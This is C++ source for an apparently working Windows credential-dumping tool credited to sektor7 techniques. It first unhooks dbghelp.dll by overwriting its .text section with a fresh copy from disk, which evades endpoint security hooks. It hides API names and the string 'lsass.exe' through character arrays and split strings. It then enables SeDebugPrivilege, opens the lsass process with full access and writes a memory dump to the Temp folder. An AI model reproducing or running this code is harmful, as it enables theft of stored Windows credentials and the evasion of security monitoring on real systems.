// credits : sektor7 unhooking with fresh DbgHelp.dll copy (implementation) 
//         && 
//           NtRaiseHardError (author of this technique)


#include <stdio.h>
#include <Windows.h>
#include <DbgHelp.h>
#include <wchar.h>
#include <iostream>
#include <TlHelp32.h>

using namespace std;

#pragma comment (lib, "Dbghelp")
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

typedef BOOL (WINAPI* OpenProcessToken_t)(
    HANDLE  ProcessHandle,
    DWORD   DesiredAccess,
    PHANDLE TokenHandle
);

typedef BOOL (WINAPI* MiniDumpWriteDump_t)(
    HANDLE                            hProcess,
    DWORD                             ProcessId,
    HANDLE                            hFile,
    MINIDUMP_TYPE                     DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
);

typedef BOOL (WINAPI* GetTokenInformation_t)(
    HANDLE                  TokenHandle,
    TOKEN_INFORMATION_CLASS TokenInformationClass,
    LPVOID                  TokenInformation,
    DWORD                   TokenInformationLength,
    PDWORD                  ReturnLength
);

typedef BOOL (WINAPI* OpenProcessToken_t)(
    HANDLE  ProcessHandle,
    DWORD   DesiredAccess,
    PHANDLE TokenHandle
);

typedef HANDLE (WINAPI* GetCurrentProcess_t)();

typedef BOOL (WINAPI* AdjustTokenPrivileges_t)(
    HANDLE            TokenHandle,
    BOOL              DisableAllPrivileges,
    PTOKEN_PRIVILEGES NewState,
    DWORD             BufferLength,
    PTOKEN_PRIVILEGES PreviousState,
    PDWORD            ReturnLength
);

typedef DWORD (WINAPI* GetProcessId_t)(
    HANDLE Process
);


typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);
VirtualProtect_t VirtualProtect_p = NULL;


unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sDbghelp[] = { 'd','b','g','h','e','l','p','.','d','l','l', 0x0 };
unsigned char sAdvapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };


void m1n1dumpIt(HANDLE hProc){

    char filepath[MAX_PATH];
    memset(filepath, 0, MAX_PATH);
    char* Buffer;
    size_t BufferCount;
    char tmp[] = { 'T','e','m','p',0 };
    _dupenv_s(&Buffer, &BufferCount, tmp);
    //printf("Buffer[TEMP] = %s\n", Buffer);
    char l$$[] = { '\\','s','y','s','D','b','.','d','m','p',0 };
    sprintf(filepath,"%s%s", Buffer,l$$);
    //printf("filepath : %s\n", filepath);
    wchar_t wfilepath[MAX_PATH];
    mbstowcs(wfilepath, filepath, MAX_PATH);
    //printf("wfilepath : %ws\n", wfilepath);

    HANDLE hFile = CreateFile(wfilepath, GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (!hFile){
        printf("Failed in m1n1dumpIT:CreateFile (%u)\n", GetLastError());
    }
    else
    {
        char StrGetProcId[] = {'G','e','t','P','r','o','c','e','s','s','I','d',0};
        GetProcessId_t pGetProcessId = (GetProcessId_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), StrGetProcId);;
        DWORD l$a$$Pid = pGetProcessId(hProc);
        //char StrMiniDmp[] = { 'M','i','n','i','D','u','m','p','W','r','i','t','e','D','u','m','p',0 };
        //char Dbgcore[] = { 'D','b','g','c','o','r','e','.','d','l','l',0 };
        //MiniDumpWriteDump_t pMiniDumpWriteDump = (MiniDumpWriteDump_t)GetProcAddress(GetModuleHandleA((LPCSTR)sDbghelp), StrMiniDmp);
        BOOL dumpStat = MiniDumpWriteDump(hProc, l$a$$Pid, hFile, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
        CloseHandle(hFile);

        if (!dumpStat){
            printf("Failed in m1n1dumpIt:M1n1DumpWr1teDump (%u)\n", GetLastError());
        }
        else {
            printf("1$a$$ Dl_lmp in %s\n", filepath);
        }
    }

    return;
}


static int UnhookDbghelp(const HMODULE hDbghelp, const LPVOID pMapping) {
    /*
        UnhookDbghelp() finds .text segment of fresh loaded copy of Dbghelp.dll and copies over the hooked one
    */
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pish->Name, ".text")) {
            // prepare hDbghelp.dll memory region for write permissions.
            VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!oldprotect) {
                // RWX failed!
                return -1;
            }
            // copy original .text section into hDbghelp memory
            memcpy((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize);

            // restore original protection settings of hDbghelp
            VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!oldprotect) {
                // it failed
                return -1;
            }
            // all is good, time to go home
            return 0;
        }
    }
    // .text section not found?
    return -1;
}

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    char StrOpenProcTokn[] = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n',0};
    OpenProcessToken_t pOpenProcessToken = (OpenProcessToken_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), StrOpenProcTokn);
    char GetCProc[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s',0};
    GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), GetCProc);
    if (pOpenProcessToken(pGetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = { 0 };
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        //char StrGetTknInfo[] = {'G','e','t','T','o','k','e','n','I','n','f','o','r','m','a','t','i','o','n',0};
        //GetTokenInformation_t pGetTokenInformation = (GetTokenInformation_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), StrGetTknInfo);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

BOOL SetDebugPrivilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };

    char StrGetProcTkn[] = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n',0};
    OpenProcessToken_t pOpenProcessToken = (OpenProcessToken_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), StrGetProcTkn);
    char GetCProc[] = { 'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s',0 };
    GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), GetCProc);
    if (!pOpenProcessToken(pGetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

    wchar_t lpwPriv[] = {'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e',0};
    if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
        CloseHandle(hToken);
        printf("I dont have SeDebugPirvs\n");
        return FALSE;
    }


    char StrAdjTkn[] = { 'A','d','j','u','s','t','T','o','k','e','n','P','r','i','v','i','l','e','g','e','s',0};
    AdjustTokenPrivileges_t pAdjustTokenPrivileges = (AdjustTokenPrivileges_t)GetProcAddress(GetModuleHandleA((LPCSTR)sAdvapi32), StrAdjTkn);
    if (!pAdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        printf("Could not adjust to SeDebugPrivs\n");

        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

void FreshCopyDbghelp() {
    unsigned char sDbghelpPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','d','b','g','h','e','l','p','.','d','l','l',0};
    unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
    unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
    unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
    unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

    unsigned int sDbghelpPath_len = sizeof(sDbghelpPath);
    unsigned int sDbghelp_len = sizeof(sDbghelp);
    int ret = 0;
    HANDLE hFile;
    HANDLE hFileMapping;
    LPVOID pMapping;

    CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateFileMappingA);
    MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sMapViewOfFile);
    UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sUnmapViewOfFile);
    VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);

    // open ntdll.dll
    hFile = CreateFileA((LPCSTR)sDbghelpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // failed to open ntdll.dll
        printf("failed to open ntdll.dll %u", GetLastError());
    }

    // prepare file mapping
    hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) {
        // file mapping failed

        CloseHandle(hFile);
        printf("file mapping failed %u", GetLastError());
    }

    // map the bastard
    pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        // mapping failed
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        printf("mapping failed %u", GetLastError());
    }

    // remove hooks
    ret = UnhookDbghelp(GetModuleHandleA((LPCSTR)sDbghelp), pMapping);

    // Clean up.
    UnmapViewOfFile_p(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);
}

int main() {

    FreshCopyDbghelp();
    DWORD l$a$$Pid = 0;
    // Find lsass PID	
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    LPCWSTR processName = L"";
    //wchar_t l$a$$[] = {'l','s','a','s','s','.','e','x','e',0};
    char l$a$$[MAX_PATH];
    memset(l$a$$, 0, MAX_PATH);
    char ls[] = "ls";
    char as[] = "as";
    char s_[] = "s.e";
    char ex[] = "xe";

    strcat(l$a$$, ls);
    strcat(l$a$$, as);
    strcat(l$a$$, s_);
    strcat(l$a$$, ex);

    //printf("l$a$$ %s\n", l$a$$);
    wchar_t wl$a$$[MAX_PATH];
    mbstowcs(wl$a$$, l$a$$, MAX_PATH);
    if (Process32First(snapshot, &processEntry)) {
        while (_wcsicmp(processName, wl$a$$) != 0) {
            Process32Next(snapshot, &processEntry);
            processName = processEntry.szExeFile;
            l$a$$Pid = processEntry.th32ProcessID;
        }
        wcout << "[+] The 1$a$$.exe PID: " << l$a$$Pid << endl;
    }
    HANDLE hProcess = NULL;
    if (!IsElevated()) {
        printf("not admin\n");
        return -1;
    }
    if (!SetDebugPrivilege()) {
        printf("no SeDebugPrivs\n");
        return -1;
    }
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, l$a$$Pid);
    if (!hProcess)
        printf("Failed in OpenProcess (%u)\n");
    m1n1dumpIt(hProcess);
    CloseHandle(hProcess);
    return 0;
}

